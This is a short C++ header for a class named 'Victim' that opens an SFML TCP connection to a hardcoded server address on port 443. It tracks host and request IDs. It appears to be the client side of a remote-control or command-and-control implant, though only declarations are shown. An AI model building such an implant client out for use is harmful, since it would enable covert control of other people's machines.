#include <SFML/Network.hpp>
#include <iostream>

class Victim {
public:
	Victim(std::string inHId);
	int runVictimProcess();

private:
	bool connectServer();

	sf::TcpSocket server;
	std::string myHId = "";
	int16_t myId = 0;
	uint16_t requestId = 1;

	sf::IpAddress serverIp = sf::IpAddress(10, 197, 9, 0);
	short serverPort = 443;

	bool isInitialized = false;
};